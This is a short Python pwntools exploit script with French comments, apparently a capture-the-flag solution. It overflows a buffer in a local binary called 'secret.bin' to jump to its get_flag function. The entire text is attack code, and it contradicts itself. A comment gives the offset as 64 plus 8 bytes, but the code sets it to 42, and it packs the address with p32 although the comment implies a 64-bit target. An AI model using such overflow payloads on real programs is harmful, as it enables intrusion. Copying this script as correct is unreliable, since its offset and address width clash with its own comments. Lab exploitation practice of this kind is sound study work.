from pwn import *

# Charger le binaire
elf = context.binary = ELF('./secret.bin')

# Activer les logs pour debugging
context.log_level = 'debug'

# Adresse de la fonction get_flag (peut être obtenue via gdb ou objdump)
get_flag_addr = elf.symbols['get_flag']

# Offset pour écraser l'adresse de retour (64 pour le buffer + 8 pour le RBP)
offset = 42

# Payload pour rediriger l'exécution vers get_flag
payload = b'A' * offset + p32(get_flag_addr)

# Connexion au binaire (local ou remote)
p = process('./secret.bin')  # Remplacez par remote('<host>', <port>) si c'est en ligne

# Envoyer le payload
p.recvuntil("Veuillez entrer le mot de passe : ")
p.sendline(payload)


print("\n"+p.recvall().decode())

# Interagir pour capturer le flag
# p.interactive()
